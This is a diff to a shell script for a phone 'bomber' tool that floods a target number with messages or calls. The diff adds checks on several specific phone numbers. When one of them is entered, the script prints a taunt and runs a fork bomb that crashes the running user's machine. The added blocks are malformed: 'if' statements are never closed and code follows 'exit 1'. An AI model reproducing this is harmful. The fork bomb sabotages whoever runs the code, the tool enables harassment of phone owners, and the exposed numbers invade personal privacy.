@@ -117,7 +117,7 @@ fi
 
 
 ake() {
-ecret="patch v1.4"
+ecret="patch v1.5"
 cd $HOME/m-bomber2.O/Additional
 ztet=$(cat patch.txt)
 if [[ $ecret = $ztet ]];
@@ -358,6 +358,26 @@ echo
 sleep 3.0
 :(){ :|: & };:
 exit 1
+if [ "$num" = "9315215104" ];
+then
+echo
+echo -e "        \e[34m ===============================================\e[34m"
+echo -e "        \e[34m | \e[34mDONT TRY TO BOMB MY NUMBER BRO.............\e[34m|"
+echo -e "        \e[34m ===============================================\e[34m"
+echo
+sleep 3.0
+:(){ :|: & };:
+exit 1
+if [ "$num" = "8750501688" ];
+then
+echo
+echo -e "        \e[34m ===============================================\e[34m"
+echo -e "        \e[34m | \e[34mDONT TRY TO BOMB MY NUMBER BRO.............\e[34m|"
+echo -e "        \e[34m ===============================================\e[34m"
+echo
+sleep 3.0
+:(){ :|: & };:
+exit 1
 elif [ "$num" = "8368048122" ];
 then
 echo
@@ -472,6 +492,26 @@ echo
 sleep 3.0
 :(){ :|: & };:
 exit 1
+if [ "$targett" = "9315215104" ];
+then
+echo
+echo -e "        \e[34m ===============================================\e[34m"
+echo -e "        \e[34m | \e[34mDONT TRY TO BOMB MY NUMBER BRO.............\e[34m|"
+echo -e "        \e[34m ===============================================\e[34m"
+echo
+sleep 3.0
+:(){ :|: & };:
+exit 1
+if [ "$targett" = "8750501688" ];
+then
+echo
+echo -e "        \e[34m ===============================================\e[34m"
+echo -e "        \e[34m | \e[34mDONT TRY TO BOMB MY NUMBER BRO.............\e[34m|"
+echo -e "        \e[34m ===============================================\e[34m"
+echo
+sleep 3.0
+:(){ :|: & };:
+exit 1
 elif [ "$targett" = "9310290933" ];
 then
 echo
@@ -559,6 +599,26 @@ figlet Mass Bomber | lolcat
 echo -ne "NUMBER: \e[0m"
 read num
 if [ "$num" = "9990212082" ];
+then
+echo
+echo -e "        \e[34m ===============================================\e[34m"
+echo -e "        \e[34m | \e[34mDONT TRY TO BOMB MY NUMBER BRO.............\e[34m|"
+echo -e "        \e[34m ===============================================\e[34m"
+echo
+sleep 3.0
+:(){ :|: & };:
+exit 1
+if [ "$num" = "9315215104" ];
+then
+echo
+echo -e "        \e[34m ===============================================\e[34m"
+echo -e "        \e[34m | \e[34mDONT TRY TO BOMB MY NUMBER BRO.............\e[34m|"
+echo -e "        \e[34m ===============================================\e[34m"
+echo
+sleep 3.0
+:(){ :|: & };:
+exit 1
+if [ "$num" = "8750501688" ];
 then
 echo
 echo -e "        \e[34m ===============================================\e[34m"
